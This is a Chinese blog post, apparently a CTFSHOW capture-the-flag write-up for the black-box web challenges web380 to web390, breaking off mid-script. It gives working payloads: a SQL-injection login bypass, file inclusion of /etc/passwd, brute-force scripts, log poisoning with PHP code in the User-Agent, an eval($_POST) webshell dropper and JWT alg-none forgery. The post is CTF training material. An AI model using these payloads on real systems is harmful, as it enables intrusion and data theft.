@@ -1,0 +1,258 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>CTFSHOW | 黑盒测试 web380 - web395 - WayneJH Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="WayneJH Blog"><meta name="msapplication-TileImage" content="https://oss.waynejoons.icu/picphoto/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="WayneJH Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="CTFSHOW 黑盒测试专题详细题解"><meta property="og:type" content="blog"><meta property="og:title" content="CTFSHOW | 黑盒测试 web380 - web395"><meta property="og:url" content="https://waynejoon.github.io/posts/ctfshow-black-box-web380-web395/"><meta property="og:site_name" content="WayneJH Blog"><meta property="og:description" content="CTFSHOW 黑盒测试专题详细题解"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725142224269.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725142333053.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725142607470.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725142727324.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725153243865.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725153615340.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725153359744.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725153243865.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725154508006.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725154640903.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725155034524.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725155312098.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725162849055.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725163117700.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725163904498.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725164018869.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725164202807.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725165047725.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725164546007.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725171214575.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725171253540.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725171808129.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725171905118.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725172615509.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725172708216.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725172828155.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725174131199.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725174241686.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250725174444249.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250726101223209.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250726101555042.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250726102012991.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250726102243669.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250726102213177.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250726102958966.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250726103109951.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250726103226033.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250726103416177.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250726105300526.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250726105358160.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250726130224180.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250726130325950.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250726130413950.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727150212179.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727151019170.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727152558175.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727151418862.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727151731833.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727152226300.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727152303115.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727153731737.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727153757690.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727154533090.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727154642253.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727154921268.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727154944575.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727155924268.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727155839329.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727160403388.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727161002389.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727163048703.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727163228862.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727163319794.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727171403864.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727172346550.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727183842499.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727184234096.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727184632353.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727184653503.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727190828512.png"><meta property="og:image" content="https://oss.waynejoons.icu/picphoto/20250727190950137.png"><meta property="article:published_time" content="2025-07-27T12:21:23.000Z"><meta property="article:modified_time" content="2025-07-27T12:22:25.874Z"><meta property="article:author" content="WayneJoon.H"><meta property="article:tag" content="CTFSHOW"><meta property="article:tag" content="CTF练习"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://oss.waynejoons.icu/picphoto/20250725142224269.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://waynejoon.github.io/posts/ctfshow-black-box-web380-web395/"},"headline":"CTFSHOW | 黑盒测试 web380 - web395","image":["https://oss.waynejoons.icu/picphoto/20250725142224269.png","https://oss.waynejoons.icu/picphoto/20250725142333053.png","https://oss.waynejoons.icu/picphoto/20250725142607470.png","https://oss.waynejoons.icu/picphoto/20250725142727324.png","https://oss.waynejoons.icu/picphoto/20250725153243865.png","https://oss.waynejoons.icu/picphoto/20250725153615340.png","https://oss.waynejoons.icu/picphoto/20250725153359744.png","https://oss.waynejoons.icu/picphoto/20250725153243865.png","https://oss.waynejoons.icu/picphoto/20250725154508006.png","https://oss.waynejoons.icu/picphoto/20250725154640903.png","https://oss.waynejoons.icu/picphoto/20250725155034524.png","https://oss.waynejoons.icu/picphoto/20250725155312098.png","https://oss.waynejoons.icu/picphoto/20250725162849055.png","https://oss.waynejoons.icu/picphoto/20250725163117700.png","https://oss.waynejoons.icu/picphoto/20250725163904498.png","https://oss.waynejoons.icu/picphoto/20250725164018869.png","https://oss.waynejoons.icu/picphoto/20250725164202807.png","https://oss.waynejoons.icu/picphoto/20250725165047725.png","https://oss.waynejoons.icu/picphoto/20250725164546007.png","https://oss.waynejoons.icu/picphoto/20250725171214575.png","https://oss.waynejoons.icu/picphoto/20250725171253540.png","https://oss.waynejoons.icu/picphoto/20250725171808129.png","https://oss.waynejoons.icu/picphoto/20250725171905118.png","https://oss.waynejoons.icu/picphoto/20250725172615509.png","https://oss.waynejoons.icu/picphoto/20250725172708216.png","https://oss.waynejoons.icu/picphoto/20250725172828155.png","https://oss.waynejoons.icu/picphoto/20250725174131199.png","https://oss.waynejoons.icu/picphoto/20250725174241686.png","https://oss.waynejoons.icu/picphoto/20250725174444249.png","https://oss.waynejoons.icu/picphoto/20250726101223209.png","https://oss.waynejoons.icu/picphoto/20250726101555042.png","https://oss.waynejoons.icu/picphoto/20250726102012991.png","https://oss.waynejoons.icu/picphoto/20250726102243669.png","https://oss.waynejoons.icu/picphoto/20250726102213177.png","https://oss.waynejoons.icu/picphoto/20250726102958966.png","https://oss.waynejoons.icu/picphoto/20250726103109951.png","https://oss.waynejoons.icu/picphoto/20250726103226033.png","https://oss.waynejoons.icu/picphoto/20250726103416177.png","https://oss.waynejoons.icu/picphoto/20250726105300526.png","https://oss.waynejoons.icu/picphoto/20250726105358160.png","https://oss.waynejoons.icu/picphoto/20250726130224180.png","https://oss.waynejoons.icu/picphoto/20250726130325950.png","https://oss.waynejoons.icu/picphoto/20250726130413950.png","https://oss.waynejoons.icu/picphoto/20250727150212179.png","https://oss.waynejoons.icu/picphoto/20250727151019170.png","https://oss.waynejoons.icu/picphoto/20250727152558175.png","https://oss.waynejoons.icu/picphoto/20250727151418862.png","https://oss.waynejoons.icu/picphoto/20250727151731833.png","https://oss.waynejoons.icu/picphoto/20250727152226300.png","https://oss.waynejoons.icu/picphoto/20250727152303115.png","https://oss.waynejoons.icu/picphoto/20250727153731737.png","https://oss.waynejoons.icu/picphoto/20250727153757690.png","https://oss.waynejoons.icu/picphoto/20250727154533090.png","https://oss.waynejoons.icu/picphoto/20250727154642253.png","https://oss.waynejoons.icu/picphoto/20250727154921268.png","https://oss.waynejoons.icu/picphoto/20250727154944575.png","https://oss.waynejoons.icu/picphoto/20250727155924268.png","https://oss.waynejoons.icu/picphoto/20250727155839329.png","https://oss.waynejoons.icu/picphoto/20250727160403388.png","https://oss.waynejoons.icu/picphoto/20250727161002389.png","https://oss.waynejoons.icu/picphoto/20250727163048703.png","https://oss.waynejoons.icu/picphoto/20250727163228862.png","https://oss.waynejoons.icu/picphoto/20250727163319794.png","https://oss.waynejoons.icu/picphoto/20250727171403864.png","https://oss.waynejoons.icu/picphoto/20250727172346550.png","https://oss.waynejoons.icu/picphoto/20250727183842499.png","https://oss.waynejoons.icu/picphoto/20250727184234096.png","https://oss.waynejoons.icu/picphoto/20250727184632353.png","https://oss.waynejoons.icu/picphoto/20250727184653503.png","https://oss.waynejoons.icu/picphoto/20250727190828512.png","https://oss.waynejoons.icu/picphoto/20250727190950137.png"],"datePublished":"2025-07-27T12:21:23.000Z","dateModified":"2025-07-27T12:22:25.874Z","author":{"@type":"Person","name":"WayneJoon.H"},"publisher":{"@type":"Organization","name":"WayneJH Blog","logo":{"@type":"ImageObject","url":{"text":"WayneJH"}}},"description":"CTFSHOW 黑盒测试专题详细题解"}</script><link rel="canonical" href="https://waynejoon.github.io/posts/ctfshow-black-box-web380-web395/"><link rel="icon" href="https://oss.waynejoons.icu/picphoto/favicon.ico"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
+  (function () {
+      function switchTab() {
+          if (!location.hash) {
+            return;
+          }
+
+          const id = '#' + CSS.escape(location.hash.substring(1));
+          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
+          if (!$tabMenu) {
+            return;
+          }
+
+          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
+          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
+          Array.from($tabMenuContainer.querySelectorAll('a'))
+              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
+              .forEach($content => $content.classList.add('is-hidden'));
+
+          if ($tabMenu) {
+              $tabMenu.parentElement.classList.add('is-active');
+          }
+          const $activeTab = document.querySelector(id);
+          if ($activeTab) {
+              $activeTab.classList.remove('is-hidden');
+          }
+      }
+      switchTab();
+      window.addEventListener('hashchange', switchTab, false);
+  })();
+  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="WayneJH Blog" type="application/atom+xml">
+</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">WayneJH</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/links">友链</a><a class="navbar-item" href="/about">关于</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="GitHub" href="https://github.com/waynejoon"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2025-07-27T12:21:23.000Z" title="2025/7/27 20:21:23">2025-07-27</time>发表</span><span class="level-item"><a class="link-muted" href="/categories/CTFSHOW/">CTFSHOW</a></span><span class="level-item">22 分钟读完 (大约3274个字)</span><span class="level-item" id="busuanzi_container_page_pv" style="display:none"><span id="busuanzi_value_page_pv">--</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">CTFSHOW | 黑盒测试 web380 - web395</h1><div class="content"><h2 id="什么是黑盒测试"><a href="#什么是黑盒测试" class="headerlink" title="什么是黑盒测试"></a>什么是黑盒测试</h2><p>黑盒测试（Black-Box Testing）是一种软件测试方法，测试人员在<strong>完全不了解程序内部结构和源代码</strong>的情况下，对程序的功能进行测试。测试人员就像普通用户一样，只能通过程序的输入（如点击链接、在输入框中填写数据）来观察其输出，以此判断程序是否存在问题</p>
+<h2 id="黑盒测试一般思路"><a href="#黑盒测试一般思路" class="headerlink" title="黑盒测试一般思路"></a>黑盒测试一般思路</h2><p>在进行黑盒测试时，通常会遵循一个系统性的流程，大致可以分为以下几个关键步骤：</p>
+<p><strong>1. 信息收集 (Reconnaissance)</strong></p>
+<p>这是所有测试的第一步，目的是尽可能多地了解目标，发现所有可能的攻击入口</p>
+<ul>
+<li><strong>目录&#x2F;文件扫描</strong>：使用工具扫描网站可能存在的隐藏目录和文件，如后台登录页面、功能性文件、源码备份等。</li>
+<li><strong>前端代码分析</strong>：查看网页的HTML、CSS和JavaScript源码（浏览器F12或Ctrl+U），从中寻找隐藏的路径、注释、API接口等。</li>
+<li><strong>技术栈识别</strong>：通过HTTP响应头、错误信息、网页页脚等判断网站使用的技术（如Apache、Nginx等），有助于我们选择更具针对性的测试方法。</li>
+</ul>
+<p><strong>2. 漏洞发现 (Vulnerability Analysis)</strong></p>
+<p>收集到足够的信息后，就可以对发现的各个功能点和入口点进行漏洞测试</p>
+<ul>
+<li><strong>输入点测试</strong>：对所有用户可以输入数据的地方（如URL参数、搜索框、登录框）进行测试，寻找SQL注入、文件包含、命令执行等漏洞。</li>
+<li><strong>认证与授权测试</strong>：测试登录认证机制是否可以被绕过或破解，例如使用万能密码、暴力破解、伪造JWT等。</li>
+<li><strong>逻辑测试</strong>：测试应用程序的业务逻辑是否存在缺陷，例如密码重置功能是否可以被滥用、支付流程是否可以被绕过等。</li>
+</ul>
+<p><strong>3. 漏洞利用 (Exploitation)</strong></p>
+<p>在确认漏洞存在后，构造特定的Payload来利用这个漏洞，以达到我们的最终目的。在CTF中，这个目的通常是读取服务器上的<code>flag</code>文件。在真实的渗透测试中，目的可能是获取服务器的控制权或窃取敏感数据等</p>
+<h2 id="题目列表"><a href="#题目列表" class="headerlink" title="题目列表"></a>题目列表</h2><h3 id="web380"><a href="#web380" class="headerlink" title="web380"></a>web380</h3><p>扫描网站目录，发现存在两个文件路径</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725142224269.png"></p>
+<p>其中第一个大小为0B，可以不用管，直接看第二个路径<code>/page.php</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725142333053.png"></p>
+<p>显示打开$id.php失败，我们尝试能不能控制这个参数，输入<code>/page.php?id=1</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725142607470.png"></p>
+<p>发现存在文件包含漏洞，直接输入<code>/page.php?id=flag</code>，查看源码得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725142727324.png"></p>
+<h3 id="web381"><a href="#web381" class="headerlink" title="web381"></a>web381</h3><p>打开网站，查看网页源代码，发现相比上一题，这里多了个可疑路径</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725153243865.png"></p>
+<p>为了更直观地看到区别，这里把上一题的网页源码放出来</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725153615340.png"></p>
+<p>我们访问路径<code>/alsckdfy</code>，成功得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725153359744.png"></p>
+<h3 id="web382"><a href="#web382" class="headerlink" title="web382"></a>web382</h3><p>打开网站，查看网页源代码，跟上一题一样</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725153243865.png"></p>
+<p>继续访问路径<code>/alsckdfy</code>，这次打开了一个登录框</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725154508006.png"></p>
+<p>尝试用万能密码，成功登录，账号<code>1&#39; or 1=1 #</code>，密码随便写，成功得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725154640903.png"></p>
+<h3 id="web383"><a href="#web383" class="headerlink" title="web383"></a>web383</h3><p>跟上题步骤一样，也是先访问路径<code>/alsckdfy</code>，打开登录框后输入万能密码得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725155034524.png"></p>
+<h3 id="web384"><a href="#web384" class="headerlink" title="web384"></a>web384</h3><p>跟之前一样，来到登录框这里，这次题目有提示，告诉我们密码前2位是小写字母，后三位是数字，很明显是要爆破</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725155312098.png"></p>
+<p>因此我们抓取登录的包来尝试爆破，账号用admin，密码可以根据题目要求生成一个字典，python脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;passwd.txt&quot;</span></span><br><span class="line"></span><br><span class="line">letters = string.ascii_lowercase  <span class="comment"># 小写字母 &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">digits = string.digits          <span class="comment"># 数字 &#x27;0123456789&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> letter_pair <span class="keyword">in</span> itertools.product(letters, repeat=<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> digit_triplet <span class="keyword">in</span> itertools.product(digits, repeat=<span class="number">3</span>):</span><br><span class="line">            password = <span class="string">&quot;&quot;</span>.join(letter_pair) + <span class="string">&quot;&quot;</span>.join(digit_triplet)</span><br><span class="line">            f.write(password + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;密码字典生成完毕，已保存到 <span class="subst">&#123;filename&#125;</span> 文件中。&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后插入到密码处爆破即可，我这里用的yakit，如果是burpsuite同理</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725162849055.png"></p>
+<p>最后爆破出来密码是<code>xy123</code>，成功得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725163117700.png"></p>
+<h3 id="web385"><a href="#web385" class="headerlink" title="web385"></a>web385</h3><p>跟之前一样，来到登录框这里，但是这次万能密码不行，题目也没有提示，先尝试扫目录看看</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725163904498.png"></p>
+<p>发现有个路径<code>/install</code>，拼接进网站访问看看</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725164018869.png"></p>
+<p>然后访问<code>/install/?install</code>，发现成功将管理员密码重置为默认密码</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725164202807.png"></p>
+<p>因为不知道默认密码，因此我们尝试进行弱口令爆破</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725165047725.png"></p>
+<p>爆破得到密码为<strong>admin888</strong>，成功得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725164546007.png"></p>
+<h3 id="web386"><a href="#web386" class="headerlink" title="web386"></a>web386</h3><p>扫描目录</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725171214575.png"></p>
+<p>访问<code>/install</code>，但是这次显示lock.dat存在</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725171253540.png"></p>
+<p>这题相比上一题多了一个<code>/clear.php</code>，访问显示清理完成，我们尝试能不能控制它清理我们指定的文件，猜测参数可能为file，访问<code>/clear.php?file=install/lock.dat</code>，接着再次访问<code>/install</code>，发现lock.dat成功被删除</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725171808129.png"></p>
+<p>这时再访问<code>/install/?install</code>重置密码即可，其他步骤跟上题一样，密码依然是<strong>admin888</strong>，成功得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725171905118.png"></p>
+<h3 id="web387"><a href="#web387" class="headerlink" title="web387"></a>web387</h3><p>扫描目录</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725172615509.png"></p>
+<p>发现多了个<code>/debug</code>，访问看看</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725172708216.png"></p>
+<p>显示<strong>file not exist</strong>，猜测可以进行文件包含，输入<code>/debug/?file=/etc/passwd</code></p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725172828155.png"></p>
+<p>成功读取到文件，尝试进行日志包含执行命令，<strong>UA</strong>写入如下内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;/var/www/html/install/lock.dat&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725174131199.png"></p>
+<p>再次访问<code>/install</code>，发现成功删除lock.dat</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725174241686.png"></p>
+<p>其他步骤跟之前一样，密码依然是<strong>admin888</strong>，成功得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250725174444249.png"></p>
+<h3 id="web388"><a href="#web388" class="headerlink" title="web388"></a>web388</h3><p>访问路径<code>/debug</code>，输入<code>/debug/?file=/etc/passwd</code>，但是这次回显方式不一样</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250726101223209.png"></p>
+<p>由于暂时没有可用的方法，因此我们对后台登录页面进行目录扫描</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250726101555042.png"></p>
+<p>由前几道题可知，flag就存放在<code>/alsckdfy/check.php</code>里面，但是我们现在暂时没有权限去访问</p>
+<p>扫描结果中我们发现路径<code>/alsckdfy/editor/</code>，访问后看到是一个编辑器</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250726102012991.png"></p>
+<p>存在文件上传页面，我们可以尝试上传一句话木马进去</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250726102243669.png"></p>
+<p>但是这里对文件上传后缀有限制</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250726102213177.png"></p>
+<p>我们把木马写好后改后缀为zip，上传文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://oss.waynejoons.icu/picphoto/20250726102958966.png"></p>
+<p>复制路径，然后拼接到<code>/debug/?file=/var/www/html</code>后面</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250726103109951.png"></p>
+<p>访问路径<code>/1.php</code>，发现成功写入webshell</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250726103226033.png"></p>
+<p>执行命令<code>tac alsckdfy/check.php</code>得到flag</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250726103416177.png"></p>
+<h3 id="web389"><a href="#web389" class="headerlink" title="web389"></a>web389</h3><p>访问路径<code>/debug</code>，这次显示权限不足</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250726105300526.png"></p>
+<p>F12查看cookie，发现多了一个auth验证</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250726105358160.png"></p>
+<p>网页解密jwt，发现是加密验证，用<strong>c-jwt-cracker</strong>爆破得到密钥为123456，然后把<strong>sub</strong>那里的user改为admin</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250726130224180.png"></p>
+<p>将token复制到<strong>auth</strong>那里，刷新网页，成功绕过权限限制</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250726130325950.png"></p>
+<p>剩下的步骤跟上题一样，最后得到flag为</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250726130413950.png"></p>
+<h3 id="web390"><a href="#web390" class="headerlink" title="web390"></a>web390</h3><p><strong>方法一（JWT伪造）：</strong></p>
+<p>访问路径<code>/debug</code>，依旧是显示权限不足，但是这次密钥爆破不出来了，因此换个方法，把alg改为none，sub改为admin，然后重新编码token，如果后端没有对算法进行验证，那么就可以成功绕过了</p>
+<p><img src="https://oss.waynejoons.icu/picphoto/20250727150212179.png"></p>
+<p>用python脚本实现，记得要先用自己jwt解码的payload复制替换dict，然后更改user为admin</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把自己的payload复制替换dict，然后更改user为admin</span></span><br><span class="line"><span class="built_in">dict</span> = &#123;</span><br><span class="line">  <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;iat&quot;</span>: <span class="number">1753530361</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1753537561</span>,</span><br><span class="line">  <span class="string">&quot;nbf&quot;</span>: <span class="number">1753530361</span>,</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;2b4b35d9ec779539cc1d8c4c8b4659aa&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span 